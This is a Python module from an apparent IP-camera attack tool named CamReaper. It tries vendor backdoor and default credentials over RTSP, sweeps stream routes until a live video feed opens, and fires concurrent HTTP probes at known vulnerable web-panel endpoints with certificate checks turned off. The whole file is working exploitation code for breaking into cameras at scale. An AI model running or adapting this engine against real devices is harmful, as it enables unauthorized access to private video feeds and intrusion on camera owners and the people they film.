"""CVE exploit engine for IP camera scanning.

Loads a CVE database and applies vendor-specific exploits (backdoor credentials
and HTTP probes) against discovered hosts.  Designed to plug into the scanner's
three-stage pipeline as a lightweight pre-brute-force stage.

Exploit types
-------------
* ``backdoor_creds``: vendor-specific hardcoded credentials tried via RTSP
  DESCRIBE (reuses the existing auth machinery).
* ``http_probe``: HTTP GET/POST requests against known vulnerable endpoints;
  a pattern match in the response indicates the CVE is exploitable.
"""

import asyncio
import json
import ssl
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

from CamReaper.report import record_cve_test
from CamReaper.rtsp import RTSPClient
from CamReaper.scanner import probe_first_open_route, try_auth

DB_PATH = Path(__file__).parent / "cve_db.json"

# Ports that serve HTTPS by convention (web panels rarely use the RTSP ones).
_HTTPS_PORTS = (443, 8443)
# Cap on a probe response: a camera panel is never bigger than this, and an
# unbounded read would let a hostile host eat the scanner's memory.
_MAX_BODY = 256 * 1024
# Cap on the response header block, same reasoning as the body cap.
_MAX_HEADER = 64 * 1024
# One shared, permissive TLS context.  Camera web panels ship self-signed (or
# expired, or CN-mismatched) certificates, so verification would reject almost
# every real device - and urllib's default context made :443 probing useless.
# This client only *reads* public CVE-bait endpoints, so an unverifiable
# certificate is not a risk here.
_SSL_CONTEXT = ssl.create_default_context()
_SSL_CONTEXT.check_hostname = False
_SSL_CONTEXT.verify_mode = ssl.CERT_NONE
# Fallback web-panel ports when a caller does not pass its own list.
DEFAULT_HTTP_PORTS = (80, 443, 8080)
# Route list used when no route list is supplied (matches the shipped defaults).
FALLBACK_ROUTES = (
    "/",
    "/0/1:1/main",
    "/3",
    "/4",
    "/cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif",
    "/h264/ch1/main/av_stream",
    "/h264/ch1/sub/av_stream",
    "/main/av_stream",
    "/stream1",
    "/superstream",
    "/user=admin&password=&channel=1&stream=0.sdp?",
)


@dataclass
class CVEEntry:
    id: str
    vendor: str
    type: str  # "backdoor_creds" | "http_probe"
    description: str
    severity: str
    credentials: list = field(default_factory=list)
    url_path: str = ""
    method: str = "GET"
    content_type: str = ""
    content: str = ""
    success_patterns: list = field(default_factory=list)


class CVEDatabase:
    """In-memory CVE database loaded from a JSON file."""

    def __init__(self, db_path: Optional[Path] = None):
        self.entries: list[CVEEntry] = []
        self.by_vendor: dict[str, list[CVEEntry]] = {}
        self.skipped: int = 0
        self._load(db_path or DB_PATH)

    def _load(self, path: Path) -> None:
        if not path.exists():
            return
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            return
        if not isinstance(data, dict):
            return
        for item in data.get("cves", []):
            # A single malformed record must not take the whole database (and
            # with it every --mode cve run) down with a KeyError traceback.
            if not isinstance(item, dict):
                self.skipped += 1
                continue
            try:
                entry = CVEEntry(
                    id=item["id"],
                    vendor=item["vendor"],
                    type=item["type"],
                    description=item.get("description", ""),
                    severity=item.get("severity", "medium"),
                    credentials=item.get("credentials", []),
                    url_path=item.get("url_path", ""),
                    method=item.get("method", "GET"),
                    content_type=item.get("content_type", ""),
                    content=item.get("content", ""),
                    success_patterns=item.get("success_patterns", []),
                )
            except (KeyError, TypeError, AttributeError):
                self.skipped += 1
                continue
            self.entries.append(entry)
            self.by_vendor.setdefault(entry.vendor, []).append(entry)

    def get_for_vendor(self, vendor: str) -> list:
        return self.by_vendor.get(vendor, [])

    def get_all_creds(self, vendor: str = None) -> list:
        """Collect all backdoor_creds CVEs for a vendor (or all vendors)."""
        creds = []
        entries = self.by_vendor.get(vendor, []) if vendor else self.entries
        for e in entries:
            if e.type == "backdoor_creds":
                creds.extend(e.credentials)
        return creds


def _is_https(port: int) -> bool:
    """True when ``port`` is probed over TLS."""
    return port in _HTTPS_PORTS


def _host_header(ip: str, port: int) -> str:
    """Host header value: the bare IP on default ports, ``ip:port`` otherwise."""
    return ip if port in (80, 443) else f"{ip}:{port}"


def _decode(chunk: bytes) -> str:
    return chunk.decode("utf-8", errors="replace")


async def _http_request(
    ip: str, port: int, path: str, method: str = "GET",
    content_type: str = "", content: str = "", timeout: float = 5.0,
    headers: list = None,
) -> tuple:
    """Perform one HTTP request and return ``(status, server_header, body)``.

    Thin wrapper over :func:`_http_request_full` for callers that only care about
    the status line, the ``Server`` header and the body.

    Implemented directly on asyncio streams instead of ``urllib`` in a worker
    thread.  urllib is blocking, so every probe used to occupy a thread from the
    event loop's *default* executor - which asyncio caps at
    ``min(32, cpu_count + 4)`` (16 on a 12-core box).  That capped the whole CVE
    stage at 16 simultaneous requests no matter how high ``--check-concurrency``
    was set, so a scan spent nearly all its time queued on those 16 threads.
    A native client scales with ``--check-concurrency`` like the RTSP stage.

    The body of a 4xx/5xx answer is returned too: a vulnerable panel usually says
    "403 Forbidden" *and* hands out the config file, so dropping the body of
    every non-200 answer would hide most of the CVEs this engine looks for.

    Returns ``("", "", "")`` on any transport failure.
    """
    status, server, body, _headers = await _http_request_full(
        ip, port, path, method, content_type, content, timeout, headers,
    )
    return status, server, body


async def _http_request_full(
    ip: str, port: int, path: str, method: str = "GET",
    content_type: str = "", content: str = "", timeout: float = 5.0,
    headers: list = None,
) -> tuple:
    """Like :func:`_http_request` but also returns the response headers.

    Returns ``(status, server_header, body, headers)`` where ``headers`` is a
    dict of lower-cased header names.  Callers that have to react to a challenge
    (the ONVIF module follows a ``WWW-Authenticate`` digest nonce) need more
    than the ``Server`` header, hence this variant.

    ``headers`` is an optional list of extra ``(name, value)`` pairs, sent
    verbatim - SOAPAction, WS-Security and Authorization headers all need this.

    Returns ``("", "", "", {})`` on any transport failure.
    """
    writer = None
    try:
        ssl_ctx = _SSL_CONTEXT if _is_https(port) else None
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port, ssl=ssl_ctx), timeout=timeout
        )
        body_bytes = content.encode() if content else b""
        head = [f"{method} {path} HTTP/1.1", f"Host: {_host_header(ip, port)}"]
        if content_type:
            head.append(f"Content-Type: {content_type}")
        head.append(f"Content-Length: {len(body_bytes)}")
        head.append("Connection: close")
        head.append("User-Agent: Mozilla/5.0")
        # Caller-supplied headers go last so they can override the defaults
        # (Authorization, SOAPAction, custom User-Agent).
        if headers:
            head.extend(f"{n}: {v}" for n, v in headers)
        request = ("\r\n".join(head) + "\r\n\r\n").encode() + body_bytes
        writer.write(request)
        await asyncio.wait_for(writer.drain(), timeout=timeout)

        # Read until the header terminator, capped so a hostile host cannot
        # stream an unbounded header block at us.
        raw = bytearray()
        while b"\r\n\r\n" not in raw:
            chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
            if not chunk:
                break  # closed early: fall through, headers are what we got
            raw += chunk
            if len(raw) > _MAX_HEADER:
                raw = raw[:_MAX_HEADER]
                break

        head_part, _, rest = bytes(raw).partition(b"\r\n\r\n")
        lines = head_part.decode("utf-8", errors="replace").split("\r\n")
        status = lines[0].split(" ")[1] if len(lines[0].split(" ")) > 1 else ""
        server = ""
        resp_headers: dict = {}
        content_length = None
        chunked = False
        for line in lines[1:]:
            name, _, value = line.partition(":")
            key = name.strip().lower()
            if not key:
                continue
            resp_headers[key] = value.strip()
            if key == "server" and not server:
                server = value.strip()
            elif key == "content-length":
                try:
                    content_length = int(value.strip())
                except ValueError:
                    content_length = None
            elif key == "transfer-encoding" and "chunked" in value.lower():
                chunked = True

        body = rest
        if chunked:
            body = await _read_chunked(reader, timeout, len(body))
        elif content_length is not None:
            want = min(max(content_length, 0), _MAX_BODY) - len(body)
            while want > 0:
                chunk = await asyncio.wait_for(reader.read(min(want, 65536)),
                                               timeout=timeout)
                if not chunk:
                    break
                body += chunk
                want -= len(chunk)
        else:
            # No length and no chunking: read until the peer closes, capped.
            while len(body) < _MAX_BODY:
                chunk = await asyncio.wait_for(reader.read(65536), timeout=timeout)
                if not chunk:
                    break
                body += chunk

        return status, server, _decode(bytes(body[:_MAX_BODY])), resp_headers
    except (asyncio.TimeoutError, OSError, ssl.SSLError, ValueError):
        return "", "", "", {}
    except Exception:
        return "", "", "", {}
    finally:
        if writer is not None:
            try:
                writer.close()
            except Exception:
                pass


async def _read_chunked(reader, timeout: float, prefix: bytes = b"") -> bytes:
    """Decode a chunked transfer body, bounded by ``_MAX_BODY``."""
    out = bytearray(prefix)
    try:
        while len(out) < _MAX_BODY:
            size_line = await asyncio.wait_for(reader.readline(), timeout=timeout)
            if not size_line:
                break
            size = int(size_line.split(b";")[0].strip() or b"0", 16)
            if size == 0:
                break
            out += await asyncio.wait_for(reader.readexactly(size), timeout=timeout)
            await asyncio.wait_for(reader.readexactly(2), timeout=timeout)  # CRLF
    except (asyncio.TimeoutError, OSError, ValueError, asyncio.IncompleteReadError):
        pass
    return bytes(out)



async def find_backdoor_stream(
    client: RTSPClient, entry: CVEEntry, route_parallel: int = 8,
    routes=None, skip: set = None,
) -> Optional[tuple]:
    """Try backdoor credentials from a CVE entry via RTSP.

    Returns ``(credential, route)`` for the first working combination, or None.
    Every attempt uses a fresh RTSPClient so the caller's socket is untouched.

    ``skip`` holds credentials already tried against this host: the same default
    password is listed by many CVE entries (``admin:admin`` appeared 15 times in
    the shipped database), and re-sending it just burns RTSP round-trips - a
    credential that failed once against a host fails every time.
    """
    ip, port, timeout = client.ip, client.port, client.timeout
    route_list = list(routes) if routes else list(FALLBACK_ROUTES)
    done = skip if skip is not None else set()
    for cred in entry.credentials:
        if cred in done:
            continue
        done.add(cred)
        probe = RTSPClient(ip, port, timeout, cred)
        try:
            if not await probe.connect():
                continue
            code, _ = await try_auth(probe, cred, "/")
            if code == "200":
                return cred, "/"
            if code == "404":
                # Valid creds, wrong route - sweep routes for a working one.
                found_route = await probe_first_open_route(
                    ip, port, timeout, route_list, cred, route_parallel,
                )
                if found_route:
                    return cred, found_route
        except Exception:
            pass
        finally:
            probe.close()
    return None


async def try_backdoor_creds(
    client: RTSPClient, entry: CVEEntry, route_parallel: int = 8,
) -> Optional[str]:
    """Backdoor credentials only: returns the working ``user:pass`` or None."""
    hit = await find_backdoor_stream(client, entry, route_parallel)
    return hit[0] if hit else None


async def try_http_probe(
    ip: str, port: int, entry: CVEEntry, timeout: float = 5.0,
) -> bool:
    """Try an HTTP-based CVE probe. Returns True if pattern matched."""
    _status, _server, body = await _http_request(
        ip, port, entry.url_path, entry.method,
        entry.content_type, entry.content, timeout,
    )
    if not body:
        return False
    body = body.lower()
    return any(p.lower() in body for p in entry.success_patterns)


async def run_cve_stage(
    ip: str,
    live: RTSPClient,
    vendor: str,
    cve_db: CVEDatabase,
    route_parallel: int = 8,
    http_timeout: float = 5.0,
    stats: dict = None,
    http_ports=None,
    routes=None,
) -> list:
    """Run all CVE exploits for a detected vendor against one host.

    ``backdoor_creds`` entries are tried over RTSP and, when one opens, the
    confirmed route is returned.  ``http_probe`` entries are sent to the web
    panel (``http_ports``) - never to the RTSP port, which would simply answer
    RTSP and score a bogus FAIL for every entry.

    Returns a list of Found streams: confirmed RTSP streams (from
    ``backdoor_creds``) plus ``is_http_cve`` markers for web-panel hits.  Only
    the former is a reason to stop scanning the host.

    A vendor that ships no ``backdoor_creds`` entry of its own (or the
    ``Generic`` catch-all) additionally gets the shared factory-default list, so
    an unidentified camera is still checked against the passwords these devices
    ship with instead of being skipped outright.
    """
    from CamReaper.scanner import Found

    entries = cve_db.get_for_vendor(vendor)
    # Fall back to the shared default-password list when the vendor has no
    # backdoor entry of its own - including the "Generic" vendor, which used to
    # disable this whole stage.
    if not any(e.type == "backdoor_creds" for e in entries):
        if vendor != "Generic":
            entries = entries + [
                e for e in cve_db.get_for_vendor("Generic")
                if e.type == "backdoor_creds"
            ]
    if not entries:
        return []

    found = []
    stream_hit = False
    # Credentials already tried against this host: the same default password is
    # listed by many CVE entries, and a credential that failed once against a
    # host fails every time.
    tried_creds: set = set()
    for entry in entries:
        if stream_hit:
            break
        if entry.type == "backdoor_creds":
            if stats is not None:
                stats["cve_tested"] = stats.get("cve_tested", 0) + 1
            hit = await find_backdoor_stream(
                live, entry, route_parallel, routes, skip=tried_creds,
            )
            if hit:
                cred, route = hit
                await record_cve_test(ip, live.port, entry.id, True)
                found.append(Found(
                    ip=ip, port=live.port, route=route,
                    credentials=cred, vendor=vendor,
                ))
                # Confirmed stream - no need to probe further CVEs for this host.
                stream_hit = True
            else:
                await record_cve_test(ip, live.port, entry.id, False)

        elif entry.type == "http_probe":
            # All (port x entry) probes go out concurrently: a dead web panel
            # costs a full timeout *each*, and running them one after another
            # made the CVE stage's wall-clock time the sum of every timeout.
            ports = list(http_ports or DEFAULT_HTTP_PORTS)
            if stats is not None:
                stats["cve_tested"] = stats.get("cve_tested", 0) + len(ports)

            async def _probe_one(hport, e=entry):
                try:
                    return hport, await try_http_probe(ip, hport, e, http_timeout)
                except Exception:
                    return hport, False

            results = await asyncio.gather(*(_probe_one(hp) for hp in ports))
            for hport, ok in results:
                await record_cve_test(ip, hport, entry.id, ok)
                if ok:
                    # The panel is vulnerable, but it gives us no RTSP
                    # credentials: report it without claiming a stream.
                    found.append(Found(
                        ip=ip, port=hport, route=entry.url_path,
                        credentials="", vendor=vendor,
                        is_http_cve=True, cve_id=entry.id,
                    ))

    return found


async def probe_http_host(
    ip: str,
    port: int,
    cve_db: CVEDatabase,
    timeout: float = 5.0,
    stats: dict = None,
) -> list:
    """Probe one HTTP/HTTPS port for CVE exploits on a host's web panel.

    Fetches the root page to fingerprint the vendor (from the ``Server`` header
    and a peek of the body), then runs every applicable ``http_probe`` CVE for
    that vendor (plus any generic http_probe CVEs).
    Returns a list of Found entries flagged as HTTP CVE hits.
    """
    from CamReaper.scanner import Found
    from CamReaper.vendor import detect_vendor_http

    # Fingerprint via a lightweight root GET (Server header + a peek of body).
    _status, server_header, body = await _http_request(ip, port, "/", timeout=timeout)
    if not body and not server_header:
        return []
    if stats is not None:
        stats["http_checked"] = stats.get("http_checked", 0) + 1

    vendor = detect_vendor_http(server_header, body)

    # Candidate entries: vendor-specific for the detected vendor, plus any
    # Generic http_probe entries (vendor-agnostic endpoints).
    entries = list(cve_db.get_for_vendor(vendor))
    if vendor != "Generic":
        entries += cve_db.get_for_vendor("Generic")
    entries = [e for e in entries if e.type == "http_probe"]
    if not entries:
        return []

    if stats is not None:
        stats["cve_tested"] = stats.get("cve_tested", 0) + len(entries)

    async def _probe_one(entry):
        try:
            return entry, await try_http_probe(ip, port, entry, timeout)
        except Exception:
            return entry, False

    results = await asyncio.gather(*(_probe_one(e) for e in entries))
    found = []
    for entry, ok in results:
        await record_cve_test(ip, port, entry.id, ok)
        if ok:
            found.append(Found(
                ip=ip, port=port, route=entry.url_path,
                credentials="", vendor=vendor,
                is_http_cve=True, cve_id=entry.id,
            ))
    return found
